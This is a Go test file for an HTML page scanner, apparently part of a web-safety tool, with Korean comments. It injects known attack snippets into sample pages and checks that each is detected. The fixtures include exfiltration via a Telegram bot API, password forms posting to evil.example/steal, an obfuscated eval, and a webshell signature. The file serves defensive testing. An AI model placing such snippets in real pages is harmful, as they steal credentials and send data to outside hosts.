package scanner

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// attacks: 정상 페이지에 끼워 넣을 공격 조각
var attacks = []struct {
	name, code, html string
	text             bool // <textarea> 안에서도 사용자에게 보임
}{
	{"javascript-url", "javascript-url", `<a href="javascript:alert(1)">x</a>`, false},
	{"zero-width", "zero-width", "<p>보이지\u200b않음</p>", true},
	{"mixed-content", "mixed-content", `<img src="http://inject.example/a.png">`, false},
	{"sri-missing", "sri-missing", `<script src="https://inject-cdn.example/a.js"></script>`, false},
	{"webshell", "webshell-signature", `<script>var m="c99shell";</script>`, false},
	{"exfil-script", "exfil-channel", `<script>fetch("https://api.telegram.org/botX/sendMessage")</script>`, false},
	{"exfil-form", "exfil-channel", `<form action="https://api.telegram.org/botX/sendMessage"><input name="m"></form>`, false},
	{"exfil-formaction", "exfil-channel", `<form action="/ok"><input name="m"><input type="submit" formaction="https://api.telegram.org/botX/sendMessage"></form>`, false},
	{"obfuscated-eval", "obfuscated-eval", `<script>eval(atob("YWxlcnQoMSk="))</script>`, false},
	{"meta-refresh", "meta-refresh-scheme", `<meta http-equiv="refresh" content="0;url=data:text/html,x">`, false},
	{"base-href", "base-href-external", `<base href="https://evil.example/">`, false},
	{"iframe-sandbox", "iframe-sandbox-escape", `<iframe src="https://x.example/" sandbox="allow-scripts allow-same-origin"></iframe>`, false},
	{"data-uri", "data-uri-document", `<iframe src="data:text/html,<script>alert(1)</script>"></iframe>`, false},
	{"download", "dangerous-download", `<a href="https://x.example/update.hta">업데이트</a>`, false},
	{"resource-ip", "resource-ip-literal", `<script src="https://203.0.113.9/a.js"></script>`, false},
	{"form-ip", "form-action-ip", `<form action="http://203.0.113.7/x"><input name="q"></form>`, false},
	{"form-ip-formaction", "form-action-ip", `<form action="/ok"><input name="q"><button formaction="http://203.0.113.7/x">go</button></form>`, false},
	{"cross-origin", "cross-origin-password-form", `<form action="https://evil.example/steal"><input type="password" name="pw"></form>`, false},
	{"cross-origin-formaction", "cross-origin-password-form", `<form action="/login"><input type="password" name="pw"><button formaction="https://evil.example/steal">로그인</button></form>`, false},
	{"cross-origin-button-first", "cross-origin-password-form", `<form action="/login"><button formaction="https://evil.example/steal">로그인</button><input type="password" name="pw"></form>`, false},
	{"cleartext", "cleartext-credentials", `<form action="http://login.inject.example/"><input type="password" name="pw"></form>`, false},
	{"cleartext-formaction", "cleartext-credentials", `<form action="/login"><input type="password" name="pw"><input type="submit" formaction="http://login.inject.example/"></form>`, false},
	{"weak-password", "weak-password-field", `<form action="/login"><input type="text" name="password"></form>`, false},
	{"local-credential", "local-credential-post", `<form action="http://127.0.0.1:8080/"><input type="password" name="pw"></form>`, false},
}

var (
	bodyOpen  = regexp.MustCompile(`(?i)<body[^>]*>`)
	bodyClose = regexp.MustCompile(`(?i)</body`)
)

// injection(): page에 snippet을 끼워 넣고, 끼워 넣은 구간의 시작 위치를 반환.
func inject(page, snippet, where string) (string, int) {
	p := len(page)
	switch where {
	case "body-start":
		if loc := bodyOpen.FindStringIndex(page); loc != nil {
			p = loc[1]
		}
	case "body-end", "comment", "textarea":
		if locs := bodyClose.FindAllStringIndex(page, -1); locs != nil {
			p = locs[len(locs)-1][0]
		}
	}
	switch where {
	case "comment":
		snippet = "<!-- " + snippet + " -->"
	case "textarea":
		snippet = "<textarea>" + snippet + "</textarea>"
	}
	return page[:p] + snippet + page[p:], p
}

func TestInjectedAttacks(t *testing.T) {
	if testing.Short() {
		t.Skip("corpus × snippet × locaation — 전체 실행에서만")
	}
	positions := []struct {
		where string
		want  func(text bool) bool // 이 위치에서 탐지되어야 하는지
	}{
		{"body-start", func(bool) bool { return true }},
		{"body-end", func(bool) bool { return true }},
		{"comment", func(bool) bool { return false }},
		{"textarea", func(text bool) bool { return text }},
	}

	pages := make([]string, len(corpus))
	for i, c := range corpus {
		data, err := os.ReadFile(filepath.Join("..", "testdata", c.file))
		if err != nil {
			t.Fatal(err)
		}
		pages[i] = string(data)
	}

	for _, pos := range positions {
		for _, a := range attacks {
			t.Run(pos.where+"/"+a.name, func(t *testing.T) {
				want := pos.want(a.text)
				var wrong []string
				for i, c := range corpus {
					html, p := inject(pages[i], a.html, pos.where)
					end := len(html) - (len(pages[i]) - p)
					got := false
					for _, f := range ScanURL(html, c.url).Findings {
						if f.Code == a.code && p <= f.Offset && f.Offset < end {
							got = true
							break
						}
					}
					if got != want {
						wrong = append(wrong, c.file)
					}
				}
				if 0 < len(wrong) {
					verb := "미탐"
					if !want {
						verb = "발동하면 안 됨"
					}
					t.Errorf("[%s] %s — %d쪽: %s", a.code, verb, len(wrong), strings.Join(wrong, ", "))
				}
			})
		}
	}
}
